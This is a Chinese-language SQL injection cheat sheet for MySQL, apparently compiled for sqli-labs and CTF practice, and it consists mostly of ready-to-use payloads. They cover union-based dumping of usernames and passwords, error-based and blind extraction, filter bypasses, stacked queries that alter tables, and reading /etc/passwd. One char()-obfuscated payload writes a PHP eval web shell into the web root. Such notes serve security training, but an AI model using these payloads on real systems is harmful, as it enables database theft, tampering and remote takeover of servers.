# sqllabs

[https://www.freebuf.com/articles/web/271772.html](https:_www.freebuf.com_articles_web_271772)

[https://blog.csdn.net/weixin_47306547/article/details/120187148](https://blog.csdn.net/weixin_47306547/article/details/120187148)

# 初步探测

## 判断闭合情况

```python
?id=1' 
?id=1" 
?id=1') 
?id=1") 
?id=1' or 1#
?id=1' or 0#
?id=1' or 1=1#
?id=1' and 1=2#
?id=1' and sleep(5)#
?id=1' and 1=2 or ' 
?id=1\
宽字节
%df%27
```

特例闭合情况

参考西电2022miniLCTFeasySQL。给了如下sql语句

![](https://cdn.nlark.com/yuque/0/2023/png/25519932/1702364335103-26535539-d0b1-4272-9ae5-5cecd1885f58.png#averageHue=%23f6f5f4&id=GPpNw&originHeight=77&originWidth=976&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

黑名单过滤颇多

![](https://cdn.nlark.com/yuque/0/2023/png/25519932/1702364335197-c22577e4-a5e2-4351-be28-a5a1da2bef28.png#averageHue=%23fcfafa&id=k9nMo&originHeight=470&originWidth=863&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

这里的闭合情况就是先转义逃离，再截断，再用分号。因为注释符号都没有了

![](https://cdn.nlark.com/yuque/0/2023/png/25519932/1702364335398-32ada51b-2165-428a-9ff2-aa01d508b2aa.png#averageHue=%23f5f4f4&id=ssV1Y&originHeight=192&originWidth=1001&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

接下来就是简单的mysql8注入了

## fuzz关键字

### 利用异或进行fuzz

![](https://cdn.nlark.com/yuque/0/2023/png/25519932/1702364335483-45096fa7-905c-4f79-9e21-8e62973f6350.png#averageHue=%23fafaf9&id=FmQl1&originHeight=177&originWidth=480&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

现在也页面当是1的时候报错，当是0的时候正常。这个时候就可以尝试用来判断被ban的关键字

以select username from users where id='$VAR'为例
当 WAF 过滤 union、and 和 or 等关键词时
当 $VAR 传参为 1'^(length("and")=0)%23 时，由于 and 被过滤，length("")=0 为真，构造 id='1'^true#，'1'和 1 异或运算结果为 0，页面反馈错误
当 $VAR 传参为 1'^(length("good")=0)%23 时，构造 id='1'^false#，'1'和 0 异或预算结果为 1，页面正常
由此对过滤的关键词进行 fuzz

## 

## 判断查询语句中的字段数

使用 order/group by 语句，通过往后边拼接数字指导页面报错，可确定字段数量。

```python
1' order by 1#
1' order by 2#
1' order by 3#
1 order by 1
1 order by 2
1 order by 3
```

使用 union select 联合查询，不断在 union select 后面加数字，直到不报错，即可确定字段数量。

```python
1' union select 1#
1' union select 1,2#
1' union select 1,2,3#
1 union select 1#
1 union select 1,2#
1 union select 1,2,3#
```

## 获取数据库信息

确定显示数据的字段位置。使用 union select 1,2,3,4,... 根据回显的字段数，判断回显数据的字段位置。

```python
-1' union select 1#
-1' union select 1,2#
-1' union select 1,2,3#
-1 union select 1#
-1 union select 1,2#
-1 union select 1,2,3#
```

在回显数据的字段位置使用 union select 将我们所需要的数据查询出来即可。包括但不限于

```python
获取当前数据库名
-1' union select 1,2,database()--+ 
获取当前数据库的表名
-1' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()--+
-1' union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=database()),3--+
获取表中的字段名
-1' union select 1,2,group_concat(column_name) from information_schema.columns where table_name='users'--+
-1' union select 1,(select group_concat(column_name) from information_schema.columns where table_name='users'),3--+
获取数据
-1' union select 1,2,group_concat(id,0x7c,username,0x7c,password) from users--+
-1' union select 1,(select group_concat(id,0x7c,username,0x7c,password) from users),3--
```

## 非注入的信息搜集

通过mysql函数和全局变量 查找mysql安装目录

```python
mysql> select @@basedir;
+-----------+
| @@basedir |
+-----------+
| /usr/     |
+-----------+
1 row in set (0.01 sec)

mysql> select @@datadir;
+-----------------+
| @@datadir       |
+-----------------+
| /var/lib/mysql/ |
+-----------------+
1 row in set (0.00 sec)

mysql> show variables like 'datadir';
+---------------+-----------------+
| Variable_name | Value           |
+---------------+-----------------+
| datadir       | /var/lib/mysql/ |
+---------------+-----------------+
1 row in set (0.01 sec)
```

@@ 用于系统变量

@ 往往用于用户定义的变量

# 几大常见的注入类型

## 报错注入

### floor()

（8.x>mysql>5.0）[双查询报错注入]。函数返回小于或等于指定值（value）的最小整数,取整。

floor(rand()*2)的值是0或者1

```python
SELECT COUNT(*), CONCAT((SELECT VERSION()), FLOOR(RAND()*2))AS a FROM information_schema.tables GROUP BY a;
select count(*), concat('~',(select user()),'~', floor(rand()*2))as a from information_schema.tables group by a;
```

派生表也行。select 1 from (table name); 这样的语法来报错，具体就是

```python
select 1 from (select count(*), concat('~',(select user()),'~', floor(rand()*2))as a from information_schema.tables group by a)x;
```

![](https://cdn.nlark.com/yuque/0/2023/png/25519932/1702364335575-db89627b-5113-4a22-bd95-69b28b517062.png#averageHue=%23fbfbfb&id=tCzmF&originHeight=733&originWidth=1331&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)![](https://cdn.nlark.com/yuque/0/2023/png/25519932/1702364335670-5fd5d787-1630-40b5-a7f2-0b6e0e07be2c.png#averageHue=%23fafafa&id=JdtOe&originHeight=604&originWidth=1027&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

### extractvalue()

第二个参数 xml中的位置是可操作的地方

```python
 AND (EXTRACTVALUE('awdwadwa',CONCAT('#',SUBSTR(HEX((SELECT DATABASE())),1,1000))))
```

### UPDATEXML()

```python
 AND UPDATEXML(1,CONCAT(0x7e,(SELECT USER()),0x7e),1)
```

### exp(9999)

exp中的参数大于709就会报错。但是在5.7.26，也就是我的电脑并没有成功复现

```python
select exp(~(select*from(select user())x));
select exp(~(select*from(select table_name from information_schema.tables where table_schema=database() limit 0,1)x));
select exp(~(select*from(select load_file('/etc/passwd'))a));
insert into users (id, username, password) values (2, '' ^ exp(~(select*from(select user())x)), 'Eyre');
update users set password='Peter' ^ exp(~(select*from(select user())x)) where id=4;
delete from users where id='1' | exp(~(select*from(select user())x));
```

这样倒更好，作为一个条件

```python
SELECT IF(3<1,EXP(30000),1)
exp(709+(1=1))
exp(710-(1=2))
```

### **cot(0)**

里面是0就会报错。可以结合条件语句进行报错注入

```python
SELECT COT(561*(IF(1>2,1,0)))
cot(1-(1=1))
```

### pow(99999,999999)

和C语言一样，是用来求平方的，我们依然利用数太大导致报错这个思路：

```python
SELECT POW(9999,9999999*IF(3<1,0,1))
```

### 

### geometrycollection()

**mysql 版本5.5**

```python
1') and geometrycollection((select * from(select * from(select version())a)b)); %23
1') and geometrycollection((select * from(select * from(select column_name from information_schema.columns where table_name='manage' limit 0,1)a)b)); %23
1') and geometrycollection((select * from(select * from(select distinct concat(0x23,user,0x2a,password,0x23,name,0x23) FROM manage limit 0,1)a)b)); %23
```

### multipoint()

**mysql 版本5.5**

```python
select multipoint((select * from(select * from(select version())a)b));
```

### polygon()

无法复现

```python
') or polygon((select * from(select * from(select (SELECT GROUP_CONCAT(user,':',password) from manage))asd)asd))--+
```

### ST_LatFromGeoHash&&ST_LongFromGeoHash

**mysql>=5.7.x**

```python
SELECT ST_LongFromGeoHash((SELECT * FROM(SELECT * FROM(SELECT DATABASE())a)b));
```

### ST_Pointfromgeohash

**mysql>5.7（无法复现应该是版本低了）**

```python
')or  ST_PointFromGeoHash(version(),1)--+
')or  ST_PointFromGeoHash((select table_name from information_schema.tables where table_schema=database() limit 0,1),1)--+
')or  ST_PointFromGeoHash((select column_name from information_schema.columns where table_name = 'manage' limit 0,1),1)--+
')or  ST_PointFromGeoHash((concat(0x23,(select group_concat(user,':',`password`) from manage),0x23)),1)--+
```

### GTID_SUBSET&GTID_SUBTRACT

```python
SELECT GTID_SUBSET(CONCAT(0x7e,(SELECT VERSION()),0x7e),1)
SELECT GTID_SUBTRACT(CONCAT(0x7e,(SELECT VERSION()),0x7e),1)
SELECT gtid_subtract(concat(0x7e,(SELECT GROUP_CONCAT(user,':',password) from manage),0x7e),1)
```

### join using() 报错获取列名

```python
获取第一个列名
SELECT * FROM (SELECT * FROM aoa_attachment_list AS a JOIN aoa_attachment_list AS b)AS c
获取第二个列名
SELECT * FROM (SELECT * FROM aoa_attachment_list AS a JOIN aoa_attachment_list AS b USING(attachment_id))d
获取第三个列名
SELECT * FROM (SELECT * FROM aoa_attachment_list AS a JOIN aoa_attachment_list AS b USING (attachment_id,attachment_name))a
```

## 用于布尔盲注的payload

### 常见payload

```python
SELECT (ASCII(RIGHT("qqwdqa",4))<100)   
SELECT ASCII(SUBSTRING((SELECT GROUP_CONCAT(attend_hmtime) FROM aoa_attends_list ),1,1)) 
SELECT ORD(SUBSTRING((SELECT GROUP_CONCAT(attend_hmtime) FROM aoa_attends_list ),1,1))
```

### order by判断

这里默认是升序。这里默认是升序

```python
SELECT eamil,user_idcard FROM aoa_user UNION SELECT 1,'26' ORDER BY 2
```

![](https://cdn.nlark.com/yuque/0/2023/png/25519932/1702364335768-681186b0-213e-4764-acc2-ee6729162d42.png#id=Wg8iW&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

## 时间盲注

### if或case结合打延时

```python
SELECT IF(1<2,SLEEP(1),1)
admin' and if(ascii(substr((select database()),1,1))>1,sleep(3),0)#
if((condition), sleep(5), 0);
CASE WHEN (condition) THEN sleep(5) ELSE 0 END;
```

### 无if和case的解决办法

假设if和case被ban了，又想要根据condition的真假来决定是否触发sleep()，可以将condition整合进sleep()中，做乘法即可:

```
sleep(5*(condition))
```

如果condition为真则返回1，5_(condition)即5_1为5，延时5秒；如果condition为假则返回0，5_(condition)即5_0为0，延时0秒。

![](https://cdn.nlark.com/yuque/0/2023/png/25519932/1702364335855-923cb02a-7ab7-4418-b799-f364149e26d2.png#id=pZBy5&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

### benchmark

是替代sleep的首选。

用法：benchmark(执行多少次，执行什么操作)

### ![](https://cdn.nlark.com/yuque/0/2023/png/25519932/1702364335976-34496dc7-fae3-4382-97df-d32ae1cd8ac3.png#id=XgmhI&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)  笛卡尔积

```python
SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.tables C;
admin' and if(ascii(substr((select database()),1,1))>1,(SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.tables C),0)#
```

### get_lock

```python
mysql> select get_lock('ddog',1);
+---------------------+
| get_lock('ddog',1) |
+---------------------+
|                   1 |
+---------------------+
1 row in set (0.00 sec)

 换新的session

mysql> select get_lock('ddog',5);
+---------------------+
| get_lock('ddog',5) |
+---------------------+
|                   0 |
+---------------------+
1 row in set (5.00 sec)
```

### 正则bug

正则匹配在匹配较长字符串但自由度比较高的字符串时，会造成比较大的计算量，我们通过rpad或repeat构造长字符串，加以计算量大的pattern，通过控制字符串长度我们可以控制延时。

```python
mysql> select rpad('a',4999999,'a') RLIKE concat(repeat('(a.*)+',30),'b');
+-------------------------------------------------------------+
| rpad('a',4999999,'a') RLIKE concat(repeat('(a.*)+',30),'b') |
+-------------------------------------------------------------+
|                                                           0 |
+-------------------------------------------------------------+
1 row in set (5.22 sec)
```

RPAD函数是MySQL中的一个字符串函数，用于将一个字符串填充到指定的长度。RPAD函数接受三个参数：

- 第一个参数是要填充的字符串。
- 第二个参数是指定字符串的总长度。
- 第三个参数是指定用于填充字符串的字符。

例如，RPAD('hello', 10, '-')的结果将会是hello-----，其中字符串'hello'被填充了7个短横线字符（'-'），以达到总长度为10。

## 

## 堆叠注入

### 堆叠注入下的简单查询

```python
0'; show databases; #
0'; show tables; #
1'; show columns from words; #
0'; show columns from `1919810931114514 `; #
```

### 改表

参考https://blog.csdn.net/qq_44657899/article/details/103239145

1，通过 rename 先把 words 表改名为其他的表名。

2，把 1919810931114514 表的名字改为 words 。

3 ，给新 words 表添加新的列名 id 。

4，将 flag 改名为 data 。

```python
1'; rename table words to word1; rename table `1919810931114514` to words;alter table words add id int unsigned not Null auto_increment primary key; alter table words change flag data varchar(100);#
```

![](https://cdn.nlark.com/yuque/0/2023/png/25519932/1702364336071-d88c6b66-7c8e-44fa-89f4-1dedce74f2f4.png#id=Fa7k9&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

一些用于改表的基础知识

- **not null**- 指示某列不能存储 NULL 值。

```
alter table persons modify age int not null;//设置 not null 约束 。
alter table person modify age int null;//取消 null 约束。
```

- **primary key** - NOT NULL 和 UNIQUE 的结合。指定主键，确保某列（或多个列的结合）有唯一标识，每个表有且只有一个主键。

```
alter table persons add age primary key (id)
```

- **unique** -保证某列的每行必须有唯一的值。(注：可以有多个 UNIQUE 约束，只能有一个 PRIMARY KEY 约束。 )

```
alter table person add unique (id);//增加unique约束。
```

- **check**-限制列中值的范围。

```
alter table person add check (id>0);
```

- **default**-规定没有给列赋值时的默认值。

```
alter table person alter city set default 'chengdu' ;//mysql
alter table person add constraint ab_c default 'chengdu' for city;//SQL Server / MS Access
```

- **auto_increment**-自动赋值，默认从1开始。
- **foreign key**-保证一个表中的数据匹配另一个表中的值的参照完整性。

### handler句柄读表内容

参考https://blog.csdn.net/qq_44657899/article/details/103239145

把表打开做为一个句柄，然后利用句柄去读内容

```python
1'; handler `FlagHere` open as `a`; handler `a` read next;#
1';HANDLER FlagHere OPEN; HANDLER FlagHere READ FIRST; HANDLER FlagHere CLOSE;#
1'; handler `1919810931114514` open as `a`; handler `a` read next;#
```

### 利用 MySql 预处理

在遇到堆叠注入时，如果select、rename、alter和handler等语句都被过滤的话，我们可以用MySql预处理语句配合concat拼接来执行sql语句拿flag。

1. PREPARE：准备一条SQL语句，并分配给这条SQL语句一个名字(hello)供之后调用
2. EXECUTE：执行命令
3. DEALLOCATE PREPARE：释放命令
4. SET：用于设置变量(@a)
5. 这里还用大小写简单绕了一下其他过滤

```python
1';sEt @a=concat("sel","ect flag from flag_here");PRepare hello from @a;execute hello;#
```

### MySql 预处理配合十六进制绕过关键字

基本原理如下：

```python
mysql> select hex('show databases');
+------------------------------+
| hex('show databases;')       |
+------------------------------+
| 73686F7720646174616261736573 |
+------------------------------+
1 row in set (0.01 sec)

mysql> set @b=0x73686F7720646174616261736573;
Query OK, 0 rows affected (0.01 sec)

mysql> prepare test from @b;
Query OK, 0 rows affected (0.02 sec)
Statement prepared

mysql> execute test;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| challenges         |
| mysql              |
| performance_schema |
| security           |
| test               |
+--------------------+
6 rows in set (0.02 sec)
```

即payload类似如下：

```python
1';sEt @a=0x73686F7720646174616261736573;PRepare hello from @a;execute hello;#
```

### MySql预处理配合字符串拼接绕过关键字

原理就是借助char()函数将ascii码转化为字符然后再使用concat()函数将字符连接起来，有了前面的基础这里应该很好理解了：

```python
set @sql=concat(char(115),char(101),char(108),char(101),char(99),char(116),char(32),char(39),char(60),char(63),char(112),char(104),char(112),char(32),char(101),char(118),char(97),char(108),char(40),char(36),char(95),char(80),char(79),char(83),char(84),char(91),char(119),char(104),char(111),char(97),char(109),char(105),char(93),char(41),char(59),char(63),char(62),char(39),char(32),char(105),char(110),char(116),char(111),char(32),char(111),char(117),char(116),char(102),char(105),char(108),char(101),char(32),char(39),char(47),char(118),char(97),char(114),char(47),char(119),char(119),char(119),char(47),char(104),char(116),char(109),char(108),char(47),char(102),char(97),char(118),char(105),char(99),char(111),char(110),char(47),char(115),char(104),char(101),char(108),char(108),char(46),char(112),char(104),char(112),char(39),char(59));prepare s1 from @sql;execute s1;
```

也可以不用concat函数，直接用char函数也具有连接功能：

```python
set @sql=char(115,101,108,101,99,116,32,39,60,63,112,104,112,32,101,118,97,108,40,36,95,80,79,83,84,91,119,104,111,97,109,105,93,41,59,63,62,39,32,105,110,116,111,32,111,117,116,102,105,108,101,32,39,47,118,97,114,47,119,119,119,47,104,116,109,108,47,102,97,118,105,99,111,110,47,115,104,101,108,108,46,112,104,112,39,59);prepare s1 from @sql;execute s1;
```

## 无列名注入

我们可以利用一些查询上的技巧来进行无列名、表名的注入。

在我们直接select 1,2时，会创建一个虚拟的表

![](https://cdn.nlark.com/yuque/0/2023/png/25519932/1702364336156-38083775-557a-42b4-8a78-f76efd40cf43.png#id=GAkC6&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

如图所见列名会被定义为1，2

当我们结合了union联合查询之后

![](https://cdn.nlark.com/yuque/0/2023/png/25519932/1702364336274-c8974182-985b-4b96-affb-627806d0edb4.png#id=gU8Cc&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

如图，我们的列名被替换为了对应的数字。也就是说，我们可以继续数字来对应列，如 2 对应了表里面的 password，进而我们就可以构造这样的查询语句来查询password：

```python
SELECT `2` FROM (SELECT 1,2 UNION SELECT * FROM USER)a;
```

![](https://cdn.nlark.com/yuque/0/2023/png/25519932/1702364336382-1b8a42e1-0c81-4293-b44d-23147472ceeb.png#id=u3GrT&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
末尾的 a 可以是任意字符，用于命名

当然，多数情况下，反引号会被过滤。当反引号不能使用的时候，可以使用别名来代替：

```python
select b from (select 1,2,3 as b union select * from admin)a;
```

然后也可以用join爆出列名

![](https://cdn.nlark.com/yuque/0/2023/png/25519932/1702364336478-a79e1aaa-9e3a-41d8-a268-5465d934f866.png#id=ajQfT&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

无join的时候判断列数可以这样一个个'1'去加，直到返回自己预期的结果

```python
id=0^((select * from f1ag_1s_h3r3_hhhhh)>(select '1','l'))
```

## False 注入利用

这里利用了只要字符串和数字进行运算就会转换成0，而任何字符串和0比较都是相等的就能全部查询出来了

![](https://cdn.nlark.com/yuque/0/2023/png/25519932/1702364336595-4599256f-21d2-4f8c-8673-6e1bd241a167.png#id=ATe1r&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

![](https://cdn.nlark.com/yuque/0/2023/png/25519932/1702364336692-889011a7-6715-42a8-bbe6-a693eb16f0a4.png#id=hah9j&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

这里可以涉及的运算符号有

```python
+   -  *  /  %  &  |  ^     这里的|和^都比较好用。比如"aa"|0返回的值是0，可以查询出结果，当是"aa"|1就没有结果了。^是同样的道理
```

另外一些组合的字符也行

```
安全等于：<=>   '=0<=>1# 拼接的语句：where username=''=0<=>1#'
不等于<>(!=)     '=0<>0# 拼接的语句：where username=''=0<>0#'
大小于>或<    '=0<>0# 拼接的语句：where username=''=0<>0#'
其他
'+1 is not null#  'in(-1,1)#  'not in(1,0)#  'like 1#  'REGEXP 1#  'BETWEEN 1 AND 1#  'div 1#  'xor 1#  '=round(0,1)='1  '<>ifnull(1,2)='1
```

## oder by注入

注入模板

```java
select * from user order by if(1=1,sleep(1),1);
```

## INSERT注入

```python
mysql> insert into users value(1,updatexml(1,concat(0x7e,database(),0x7e),1),1);
ERROR 1105 (HY000): XPATH syntax error: '~security~'
```

### 拼接改数据

例题

![](https://cdn.nlark.com/yuque/0/2023/png/25519932/1702364336781-fc56fffe-25cd-4e00-9197-d9d69a6ab064.png#averageHue=%232e2c2b&id=GIgAd&originHeight=146&originWidth=782&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

![](https://cdn.nlark.com/yuque/0/2023/png/25519932/1702364336870-b4ae2301-fa0b-4311-8a54-1ed4c52d77a2.png#averageHue=%23fcfcfc&id=rrROb&originHeight=169&originWidth=663&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

### 拼接确定注入回显点

在比如添加评论的地方，可以尝试拼接注入一下

```python
aa'),('a',database(),"aaa")#  回显了数据库，那么可以猜测后台是下面语句
insert into wfy_comments('text','user','name') values ('$_POST['comment']','$_POST['user']','$_POST['name']');
```

## 

## 

## 

## 

## 

## sql注入读文件

利用Mysql load data特性来读取文件

```python
load data local infile '/etc/passwd' into table test fields terminated by '\n';
```

先创建一张表再将文件读入表内。然后再联合查询读出文件的内容

```python
file = '/sys/class/net/eth0/address'
file = '/etc/machine-id'
file='/proc/self/cgroup'
payload1 = f'''1';create table {table_name}(name varchar(30000));load data  local infile "{file}" into table ctf.{table_name} FIELDS TERMINATED BY '\n';#'''
payload2 = f'''1' union select 1,2,3,4,(select GROUP_CONCAT(NAME) from ctf.{table_name})#'''
```

## Quine注入

下面就是经典的Quine注入代码

```python
if ($row['passwd'] === $password) {
        if($password == 'b2f2d15b3ae082ca29697d8dcd420fd7'){
            show_source(__FILE__);
            die;
        }
        else{
            die($FLAG);
        }
    } else {
        alertMes("wrong password",'index.php');
    }
```

`username=bilala&passwd='/**/union/**/select/**/replace(replace('"/**/union/**/select/**/replace(replace("%",0x22,0x27),0x25,"%")#',0x22,0x27),0x25,'"/**/union/**/select/**/replace(replace("%",0x22,0x27),0x25,"%")#')#`

## mysql8注入

参考

[https://www.anquanke.com/post/id/231627#h3-9](https://www.anquanke.com/post/id/231627#h3-9)

### mysql8特性总结

参考

[https://www.jianshu.com/p/b3e2618f97c4](https://www.jianshu.com/p/b3e2618f97c4)

#### 非递归 CTE

```python
# 以前子查询或派生表
select * from (select 1) as dd;

# 通用表表达式
with dd as (select 1) select * from dd;

# 通用表表达式
with dd(id) as (select 1),
  dd2(id) as (select id+1 from dd)
  select * from dd join dd2;
```

#### 递归 CTE

递归CTE在查询中引用自己的定义，使用 recursive 表示，示例:

```python
with recursive dd(n) as(
  select 1
  union all
  select n+1 from dd where n < 5
) select * from dd;
```

CTE 支持select，insert，update，delete等语句。

### TABLE ()

**作用**：列出表中全部内容

TABLE是MySQL 8.0.19中引入的DML语句，它返回命名表的行和列，类似于SELECT。
支持UNION联合查询、ORDER BY排序、LIMIT子句限制产生的行数。

![](https://cdn.nlark.com/yuque/0/2023/png/25519932/1702364336999-60ba3c8e-ac5a-4ce4-abc8-200d0cf74070.png#averageHue=%23cdbaa0&id=Qby2i&originHeight=313&originWidth=662&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

加上order by排序或LIMIT限制后

```python
table users order by password;
table users limit 1;
table users limit 0,1;
table users limit 1,1;
```

与SELECT的区别：

1.TABLE始终显示表的所有列
2.TABLE不允许对行进行任意过滤，即TABLE 不支持任何WHERE子句

### VALUES()

**作用**：列出一行的值

VALUES是把一组一个或多个行作为表展示出来，返回的也是一个表数据。
ROW()返回的是一个行数据，VALUES将ROW()返回的行数据加上字段整理为一个表，然后展示

![](https://cdn.nlark.com/yuque/0/2023/png/25519932/1702364337084-b5a2f1db-5857-480f-8d1b-5677d2cfc6ea.png#averageHue=%23d1bda3&id=KuRXd&originHeight=313&originWidth=638&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

### 绕过select

```python
1.判断列数
TABLE users union VALUES ROW(1,2,3);
2.使用values判断回显位
select * from users where id=-1 union values row(1,2,3); //这个id的值为不存在，查询不出东西，加上联合查询的话，这里最后出来的数据只有联合查询的
```

### 盲注payload模板

```python
mysql> select ((1,'','')<(table users limit 1));
+-----------------------------------+
| ((1,'','')<(table users limit 1)) |
+-----------------------------------+
|                                 1 |
+-----------------------------------+
```

实质上是(id, username, password)与(1, 'Dumb', 'Dumb')进行比较，比较顺序为自左向右，第一列(也就是第一个元组元素)判断正确再判断第二列(也就是第二个元组元素)。
两个元组第一个字符比大小，如果第一个字符相等就比第二个字符的大小，以此类推，最终结果即为元组的大小。

```python
mysql> select ((2,'','')<(table users limit 1));
+-----------------------------------+
| ((2,'','')<(table users limit 1)) |
+-----------------------------------+
|                                 0 |
+-----------------------------------+
1 row in set (0.00 sec)

mysql> select ((1,'Du','')<(table users limit 1));
+-------------------------------------+
| ((1,'Du','')<(table users limit 1)) |
+-------------------------------------+
|                                   1 |
+-------------------------------------+
```

小技巧

```python
最好用<=替换<，用<比较一开始并没有问题，但到最后一位时结果为正确字符的前一个字符，用<=结果更直观。
mysql> select ((1,'Dumb','Dumb')<=(table users limit 1));
+--------------------------------------------+
| ((1,'Dumb','Dumb')<=(table users limit 1)) |
+--------------------------------------------+
|                                          1 |
+--------------------------------------------+
1 row in set (0.00 sec)

mysql> select ((1,'Dumb','Dumc')<=(table users limit 1));
+--------------------------------------------+
| ((1,'Dumb','Dumc')<=(table users limit 1)) |
+--------------------------------------------+
|                                          0 |
+--------------------------------------------+
1 row in set (0.00 sec)
```

### 注数据库

因为table不能像select控制列数，除非列数一样的表，不然都回显不出来。
需要使用table查询配合无列名盲注
information_schema.schemata表有6列
因为schemata表中的第一列是def，不需要判断，所以可以直接判断库名

```python
1' and ('def','m','',4,5,6)<=(table information_schema.schemata limit 1)--+ #回显正常
1' and ('def','n','',4,5,6)<=(table information_schema.schemata limit 1)--+ #回显错误
#得到第1个数据库名的第一个字符为m
......
1' and ('def','mysql','',4,5,6)<=(table information_schema.schemata limit 1)--+ #回显正常
1' and ('def','mysqm','',4,5,6)<=(table information_schema.schemata limit 1)--+ #回显错误
1' and ('def','information_schema','',4,5,6)<=(table information_schema.schemata limit 1,1)--+ #回显正常
1' and ('def','information_schemb','',4,5,6)<=(table information_schema.schemata limit 1,1)--+ #回显错误
#说明第2个数据库名为information_schema
......
一直猜解，直到获得全部数据库名
```

### 爆数据表

information_schema.tables表有21列

```python
1' and ('def','security','users','',5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21)<=(table information_schema.tables limit 317,1)--+ #第一个表users

1' and ('def','security','emails','',5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21)<=(table information_schema.tables limit 318,1)--+ #第二个表emails

1' and ('def','security','uagents','',5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21)<=(table information_schema.tables limit 319,1)--+ #第三个表uagents

1' and ('def','security','referers','',5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21)<=(table information_schema.tables limit 320,1)--+ #第四个表referers
```

### 爆字段名

information_schema.columns表有22列
得到所有表名后开始判断字段名，找到columns表，具体方法和上面一样

```python
1' and ('def','security','users','id','',6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22)<=(table information_schema.columns limit 3386,1)--+ #users表第一个字段为id

1' and ('def','security','users','password','',6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22)<=(table information_schema.columns limit 3387,1)--+ #users表，第二个字段为password

1' and ('def','security','users','username','',6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22)<=(table information_schema.columns limit 3388,1)--+ #users表，第三个字段为username
```

### 爆数据

```python
1' and (1,'D','')<=(table users limit 1)--+ #正常
1' and (1,'E','')<=(table users limit 1)--+ #错误

#table users limit 1也就是table users limit 0,1
#1' and (1,'D','')<=(table users limit 0,1)--+ #正常
#1' and (1,'E','')<=(table users limit 0,1)--+ #错误
......
1' and (1,'Dumb','Dumb')<=(table users limit 1)--+ #正常
1' and (1,'Dumb','Dumc')<=(table users limit 1)--+ #错误
```

## 

## java下的sql注入

参考https://forum.butian.net/share/1749

黑名单禁用了单双引号，现在需要万能密码登录就直接用ngnl表达式绕过

```
password=1${@java.lang.Character@toString(39)}or(1))#
```

# 普通的函数替代

### information_schema绕过

能够代替information_schema的有：

- sys.schema_auto_increment_columns 只显示有自增的表
- sys.schema_table_statistics_with_buffer
- sys.x$ps_schema_table_statistics_io
- sys.x$schema_table_statistics_with_buffer
- mysql.innodb_table_stats
- mysql.innodb_table_index
- mysql.innodb_index_stats
- sys.statement_analysis

sys.x$schema_flattened_keys

sys.schema_table_statistics

sys.x$statement_analysis

上面这些表都有很多关键数据。可以在注入前看看里面有没有自己需要的数据

```python
select * from user where id = -1 union all select 1,2,3,group_concat(table_name)from sys.schema_table_statistics_with_buffer where table_schema=database();
```

# 字符串截取方法

### substr()

```python
SELECT SUBSTR((SELECT DATABASE()),2,1)
```

### mid()

```python
SELECT MID((SELECT DATABASE()),2,1)
```

### right()

表示截取字符串的右面几位。

使用方法：right(截取的字符串，截取长度)

```python
SELECT RIGHT((SELECT DATABASE()),5)
```

![](https://cdn.nlark.com/yuque/0/2023/png/25519932/1702364337182-9edcda31-2e8c-4d52-86da-8efbdc51d5d9.png#averageHue=%23f0da76&id=dK7Gg&originHeight=292&originWidth=488&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

可以用于盲注

ascii()或ord()返回传入字符串的首字母的ASCII码

### left()

表示截取字符串的左面几位。

使用方法：left(截取的字符串，截取长度)

```python
SELECT LEFT((SELECT DATABASE()),2)
```

![](https://cdn.nlark.com/yuque/0/2023/png/25519932/1702364337304-ddebd442-4d93-45bd-a706-2d5b9c841969.png#averageHue=%23d4baab&id=OWT60&originHeight=392&originWidth=391&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

可以配合reverse来把字符串逆转过来，那么此时第一位就是我们需要判断的。再结合ascii()或ord()返回传入字符串的首字母的ASCII码进行比较即可

![](https://cdn.nlark.com/yuque/0/2023/png/25519932/1702364337384-82cfb1f9-e0d7-416d-99fc-06b0aee6d073.png#averageHue=%23eac1ab&id=NSmfa&originHeight=319&originWidth=835&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

paylaod

```python
SELECT ASCII(REVERSE(LEFT((SELECT DATABASE()),2)))
```

### insert()

虽然字面意思为插入，其实是个字符串替换的函数！

用法：insert(字符串，起始位置，长度，替换为什么)

![](https://cdn.nlark.com/yuque/0/2023/png/25519932/1702364337475-65417c72-e9ba-479c-9336-2ac6eb3a52e9.png#averageHue=%2329333b&id=Ed2Vu&originHeight=314&originWidth=669&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

